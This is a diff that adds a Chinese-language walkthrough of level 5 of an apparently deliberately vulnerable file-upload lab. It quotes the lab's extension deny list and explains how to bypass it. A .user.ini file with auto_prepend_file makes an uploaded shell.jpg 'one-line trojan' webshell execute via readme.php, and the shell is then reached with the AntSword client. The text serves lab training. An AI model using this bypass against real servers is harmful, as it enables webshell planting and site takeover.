@@ -181,3 +181,41 @@ SetHandler application/x-httpd-php
 
 修改shell.php后缀为shell.txt,然后上传，上传成功后使用中国蚁剑连接。
 
+# 第5关
+
+1.分析核心源代码
+
+```text
+$deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
+
+```
+
+这里漏掉了.ini配置文件，可以上传.user.ini文件，对apache和nginx通用。（.htaccess只对apache有效）
+
+.user.ini文件可以指定一个文件，其他php文件在执行前会在首行/末尾包含指定文件的内容。
+
+```text
+;在首行包含shell.jpg的内容
+auto_prepend_file = shell.jpg
+
+;在末尾包含shell.jpg的内容
+auto_append_file = shell.jpg
+```
+
+2.创建、编辑并上传.user.ini文件
+
+.user.ini文件内容如下：
+
+```text
+auto_prepend_file = shell.jpg
+```
+
+.user.ini文件上传成功后需要等待一段时间生效（1分钟以内）。
+
+3.修改shell.php改为shell.jpg并上传
+
+4.检测生效
+
+在upload文件夹下靶场放置了一个readme.php文件，访问readme.php文件，readme.php文件则会把shell.jpg文件中的一句话木马包含进去一起执行。
+
+5.中国蚁剑连接
